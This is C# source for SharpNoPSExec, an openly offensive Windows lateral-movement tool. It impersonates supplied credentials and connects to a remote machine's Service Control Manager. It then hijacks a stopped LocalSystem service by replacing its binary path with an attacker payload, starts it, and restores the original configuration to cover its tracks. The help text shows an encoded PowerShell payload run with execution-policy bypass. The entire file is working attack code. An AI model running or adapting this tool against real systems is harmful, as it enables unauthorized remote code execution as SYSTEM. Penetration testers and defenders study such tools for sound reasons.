using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;

namespace SharpNoPSExec
{
    class ProgramOptions
    {
        public string target;
        public string username;
        public string password;
        public string payload;
        public string service;
        public string domain;

        public ProgramOptions(string uTarget = "", string uPayload = "", string uUsername = "", string uPassword = "", string uService = "", string uDomain = ".")
        {
            target = uTarget;
            username = uUsername;
            password = uPassword;
            payload = uPayload;
            service = uService;
            domain = uDomain;
        }
    }

    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        private struct QUERY_SERVICE_CONFIG
        {
            public uint serviceType;
            public uint startType;
            public uint errorControl;
            public IntPtr binaryPathName;
            public IntPtr loadOrderGroup;
            public int tagID;
            public IntPtr dependencies;
            public IntPtr startName;
            public IntPtr displayName;
        }

        public struct ServiceInfo
        {
            public uint serviceType;
            public uint startType;
            public uint errorControl;
            public string binaryPathName;
            public string loadOrderGroup;
            public int tagID;
            public string dependencies;
            public string startName;
            public string displayName;
            public IntPtr serviceHandle;
        }


        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean ChangeServiceConfig(
            IntPtr hService,
            UInt32 nServiceType,
            UInt32 nStartType,
            UInt32 nErrorControl,
            String lpBinaryPathName,
            String lpLoadOrderGroup,
            IntPtr lpdwTagId,
            String lpDependencies,
            String lpServiceStartName,
            String lpPassword,
            String lpDisplayName);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(
            IntPtr hSCManager,
            string lpServiceName,
            uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(
            string machineName,
            string databaseName,
            uint dwAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern Boolean QueryServiceConfig(
            IntPtr hService,
            IntPtr intPtrQueryConfig,
            UInt32 cbBufSize,
            out UInt32 pcbBytesNeeded);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(
            IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors);

        [DllImport("advapi32.dll")]
        public static extern bool LogonUserA(
            string lpszUsername,
            string lpszDomain,
            string lpszPassword,
            int dwLogonType,
            int dwLogonProvider,
            ref IntPtr phToken
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        private const uint SERVICE_NO_CHANGE = 0xFFFFFFFF;
        private const uint SERVICE_DEMAND_START = 0x00000003;
        private const uint SERVICE_DISABLED = 0x00000004;
        private const uint SC_MANAGER_ALL_ACCESS = 0xF003F;

        enum LOGON_TYPE
        {
            LOGON32_LOGON_INTERACTIVE = 2,
            LOGON32_LOGON_NETWORK = 3,
            LOGON32_LOGON_BATCH = 4,
            LOGON32_LOGON_SERVICE = 5,
            LOGON32_LOGON_UNLOCK = 7,
            LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
            LOGON32_LOGON_NEW_CREDENTIALS = 9
        }

        public enum LOGON_PROVIDER
        {
            /// <summary>
            /// Use the standard logon provider for the system.
            /// The default security provider is negotiate, unless you pass NULL for the domain name and the user name
            /// is not in UPN format. In this case, the default provider is NTLM.
            /// NOTE: Windows 2000/NT:   The default security provider is NTLM.
            /// </summary>
            LOGON32_PROVIDER_DEFAULT = 0,
            LOGON32_PROVIDER_WINNT35 = 1,
            LOGON32_PROVIDER_WINNT40 = 2,
            LOGON32_PROVIDER_WINNT50 = 3
        }

        public static ServiceInfo GetServiceInfo(string ServiceName, IntPtr SCMHandle)
        {
            Console.WriteLine($"    |-> Querying service {ServiceName}");
            ServiceInfo serviceInfo = new ServiceInfo();

            try
            {
                IntPtr serviceHandle = OpenService(SCMHandle, ServiceName, 0xF01FF);

                if (serviceHandle == IntPtr.Zero)
                {
                    throw new Win32Exception(); 
                }

                uint bytesNeeded = 0;
                QUERY_SERVICE_CONFIG qsc = new QUERY_SERVICE_CONFIG();

                IntPtr qscPtr = IntPtr.Zero;

                bool retCode = QueryServiceConfig(serviceHandle, qscPtr, 0, out bytesNeeded);

                if (!retCode && bytesNeeded == 0)
                {
                    throw new Win32Exception();
                }
                else
                {
                    qscPtr = Marshal.AllocCoTaskMem((int)bytesNeeded);
                    retCode = QueryServiceConfig(serviceHandle, qscPtr, bytesNeeded, out bytesNeeded);
                    if (!retCode)
                    {
                        throw new Win32Exception();
                    }
                    qsc.binaryPathName = IntPtr.Zero;
                    qsc.dependencies = IntPtr.Zero;
                    qsc.displayName = IntPtr.Zero;
                    qsc.loadOrderGroup = IntPtr.Zero;
                    qsc.startName = IntPtr.Zero;

                    qsc = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(qscPtr, typeof(QUERY_SERVICE_CONFIG));
                }

                serviceInfo.binaryPathName = Marshal.PtrToStringAuto(qsc.binaryPathName);
                serviceInfo.dependencies = Marshal.PtrToStringAuto(qsc.dependencies);
                serviceInfo.displayName = Marshal.PtrToStringAuto(qsc.displayName);
                serviceInfo.loadOrderGroup = Marshal.PtrToStringAuto(qsc.loadOrderGroup);
                serviceInfo.startName = Marshal.PtrToStringAuto(qsc.startName);

                serviceInfo.errorControl = qsc.errorControl;
                serviceInfo.serviceType = qsc.serviceType;
                serviceInfo.startType = qsc.startType;
                serviceInfo.tagID = qsc.tagID;
                serviceInfo.serviceHandle = serviceHandle; // Return service handler

                Marshal.FreeHGlobal(qscPtr);
            }
            catch (Exception)
            {
                string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                Console.WriteLine("\n[!] GetServiceInfo failed. Error: {0}", errorMessage);
                return serviceInfo;
            }

            return serviceInfo;
        }

        public static void PrintBanner()
        {
            Console.WriteLine(@"
███████╗██╗  ██╗ █████╗ ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗███████╗ ██████╗
██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝
███████╗███████║███████║██████╔╝██████╔╝██╔██╗ ██║██║   ██║██████╔╝███████╗█████╗   ╚███╔╝ █████╗  ██║     
╚════██║██╔══██║██╔══██║██╔══██╗██╔═══╝ ██║╚██╗██║██║   ██║██╔═══╝ ╚════██║██╔══╝   ██╔██╗ ██╔══╝  ██║     
███████║██║  ██║██║  ██║██║  ██║██║     ██║ ╚████║╚██████╔╝██║     ███████║███████╗██╔╝ ██╗███████╗╚██████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝

Version: 0.0.3
Author: Julio Ureña (PlainText)
Twitter: @juliourena
");
        }

        public static void PrintHelp()
        {
            Console.WriteLine(@"Usage: 
SharpNoPSExec.exe --target=192.168.56.128 --payload=""c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ZQBjAGgAbwAgAEcAbwBkACAAQgBsAGUAcwBzACAAWQBvAHUAIQA=""

Required Arguments:
--target=       - IP or machine name to attack.
--payload=      - Payload to execute in the target machine.

Optional Arguments:
--username=     - Username to authenticate to the remote computer.
--password=     - Username's password.
--domain=       - Domain Name, if no set a dot (.) will be used instead.

--service=      - Service to modify to execute the payload, after the payload is completed the service will be restored.
Note: If not service is specified the program will look for a random service to execute.
Note: If the selected service has a non-system account this will be ignored.

--help          - Print help information.
");
        }

        // When working with Covenant I notice when targeting non interactive sessions it pass the quotes as part of the payload which make it fail.
        // This code will remove quotes if exits. 
        public static string SanitizeInput(string variable)
        {
            if (variable == null)
                return "";

            string lastChar = variable.Substring(variable.Length - 1);
            string firstChar = variable.Substring(0, 1);
            if (firstChar == lastChar)
            {
                if (lastChar == "'" || lastChar == '"'.ToString())
                    variable = variable.Trim(lastChar.ToCharArray());
            }
            return variable;
        }

        static void Main(string[] args)
        {
            // example from https://github.com/s0lst1c3/SharpFinder
            ProgramOptions options = new ProgramOptions();

            foreach (var arg in args)
            {
                if (arg.StartsWith("--target="))
                {
                    string[] components = arg.Split(new string[] { "--target=" }, StringSplitOptions.None);
                    options.target = SanitizeInput(components[1]);
                }
                else if (arg.StartsWith("--payload="))
                {
                    string[] components = arg.Split(new string[] { "--payload=" },StringSplitOptions.None);

                    options.payload = SanitizeInput(components[1]);

                }
                else if (arg.StartsWith("--username="))
                {
                    string[] components = arg.Split(new string[] { "--username=" }, StringSplitOptions.None);
                    options.username = SanitizeInput(components[1]);
                }
                else if (arg.StartsWith("--password="))
                {
                    string[] components = arg.Split(new string[] { "--password=" }, StringSplitOptions.None);
                    options.password = SanitizeInput(components[1]);
                }
                else if (arg.StartsWith("--domain="))
                {
                    string[] components = arg.Split(new string[] { "--domain=" }, StringSplitOptions.None);
                    options.domain = SanitizeInput(components[1]);
                }
                else if (arg.StartsWith("--service="))
                {
                    string[] components = arg.Split(new string[] { "--service=" }, StringSplitOptions.None);
                    options.service = SanitizeInput(components[1]);
                }
                else if (arg.StartsWith("--help"))
                {
                    PrintBanner();
                    PrintHelp();
                    return;
                }
                else
                {
                    Console.WriteLine("[!] Invalid flag: " + arg);
                    return;
                }
            }

            if (options.target == "" || options.payload == "")
            {
                PrintBanner();
                PrintHelp();
                return;
            }


            bool result = false;

            if (!String.IsNullOrEmpty(options.username) && !String.IsNullOrEmpty(options.password))
            {
                IntPtr phToken = IntPtr.Zero;

                result = LogonUserA(options.username, options.domain, options.password, (int)LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, (int)LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, ref phToken);

                if (!result)
                {
                    string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                    Console.WriteLine("[!] LogonUser failed. Error: {0}", errorMessage);
                    return;
                }

                result = ImpersonateLoggedOnUser(phToken);
                if (!result)
                {
                    string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                    Console.WriteLine("[!] ImpersonateLoggedOnUser failed. Error:{0}", errorMessage);
                    return;
                }
            }

            bool found = false;
            try
            {
                Console.WriteLine($"\n[>] Open SC Manager from {options.target}.");
                IntPtr SCMHandle = OpenSCManager(options.target, null, SC_MANAGER_ALL_ACCESS);

                if (SCMHandle == IntPtr.Zero)
                {
                    string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                    Console.WriteLine("[!] OpenSCManager failed. Error: {0}", errorMessage);
                    return;
                }

                // Open Connection to the remote machine and get all services 
                Console.WriteLine($"\n[>] Getting services information from {options.target}.");
                ServiceController[] services = ServiceController.GetServices(options.target);

                ServiceInfo serviceInfo = new ServiceInfo();

                if (options.service == "")
                {
                    Console.WriteLine($"\n[>] Looking for a random service to execute our payload.");

                    Random r = new Random();
                    for (int i = 0; i < services.Length; i++)
                    {
                        
                        int value = r.Next(0, services.Length);

                        // Check some values to select a service to use to trigger our paylaod 
                        if (services[value].StartType == ServiceStartMode.Disabled && services[value].Status == ServiceControllerStatus.Stopped && services[value].ServicesDependedOn.Length == 0)
                        {
                            serviceInfo = GetServiceInfo(services[value].ServiceName, SCMHandle);

                            if (serviceInfo.startName.ToLower() == "localsystem")
                            {
                                Console.WriteLine($"    |-> Service {services[value].ServiceName} authenticated as {serviceInfo.startName}.");
                                found = true;
                                break;
                            }
                        }
                    }
                    
                    // If not service was found search for services with start mode manual, stopped without dependencies. 
                    if (!found)
                    {
                        for (int i = 0; i < services.Length; i++)
                        {
                            int value = r.Next(0, services.Length);
                            // Check some values to select a service to use to trigger our paylaod (Manual Services) 
                            if (services[value].StartType == ServiceStartMode.Manual && services[value].Status == ServiceControllerStatus.Stopped && services[value].ServicesDependedOn.Length == 0)
                            {
                                serviceInfo = GetServiceInfo(services[value].ServiceName, SCMHandle);

                                if (serviceInfo.startName.ToLower() == "localsystem")
                                {
                                    Console.WriteLine($"    |-> Service {services[value].ServiceName} authenticated as {serviceInfo.startName}.");
                                    found = true;
                                    break;
                                }
                            }
                        }
                    }
                    if (!found)
                    {
                        Console.WriteLine($"[!] No service found that met the default conditions, please select the service to run.");
                        return;
                    }
                }
                else
                {
                    Console.WriteLine($"\n[>] Checking if service {options.service} exists.");

                    // Check if --server=value exits. 
                    foreach (var svc in services)
                    {
                        if (svc.ServiceName == options.service)
                            found = true;
                    }

                    if (found)
                    { 
                        serviceInfo = GetServiceInfo(options.service, SCMHandle);
                        if (serviceInfo.startName.ToLower() == "localsystem")
                        {
                            Console.WriteLine($"    |-> Service {options.service} authenticated as {serviceInfo.startName}.");
                        }
                        else
                        {
                            Console.WriteLine($"\n[!] The service {options.service} is authenticated {serviceInfo.displayName} aborting to not lose the account.");
                            return;
                        }
                    }
                    else
                    {
                        Console.WriteLine($"    |-> Service not found {options.service}.");
                        return;
                    }
                }

                string previousImagePath = serviceInfo.binaryPathName;

                Console.WriteLine($"\n[>] Setting up payload.");

                Console.WriteLine($"    |-> payload = {options.payload}");

                Console.WriteLine($"    |-> ImagePath previous value = {previousImagePath}.");

                // Modify the service with the payload
                Console.WriteLine($"    |-> Modifying ImagePath value with payload.");

                result = ChangeServiceConfig(serviceInfo.serviceHandle, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, 0, options.payload, null, IntPtr.Zero, null, null, null, null);

                if (!result)
                {
                    string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                    Console.WriteLine("[!] ChangeServiceConfig failed. Error: {0}", errorMessage);
                    return;
                }

                Console.WriteLine($"\n[>] Starting service {serviceInfo.displayName} with new ImagePath.");

                result = StartService(serviceInfo.serviceHandle, 0, null);

                //if(!result)
                //Console.WriteLine($"    |-> Possible command execution completed.");

                // Wait 5 seconds before restoring the values
                Console.WriteLine($"\n[>] Waiting 5 seconds to finish.");
                Thread.Sleep(5000);

                Console.WriteLine($"\n[>] Restoring service configuration.");

                result = ChangeServiceConfig(serviceInfo.serviceHandle, SERVICE_NO_CHANGE, serviceInfo.startType, 0, previousImagePath, null, IntPtr.Zero, null, serviceInfo.startName, null, null);
                if (!result)
                {
                    string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
                    Console.WriteLine("[!] ChangeServiceConfig failed. Error: {0}", errorMessage);
                    return;
                }
                else
                {
                    Console.WriteLine($"    |-> {serviceInfo.displayName} Log On => {serviceInfo.startName}.");
                    Console.WriteLine($"    |-> {serviceInfo.displayName} status => {serviceInfo.startType}.");
                    Console.WriteLine($"    |-> {serviceInfo.displayName} ImagePath => {previousImagePath}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\n[!] General Error: {0}\n", ex.Message);
            }
        }
    }
}
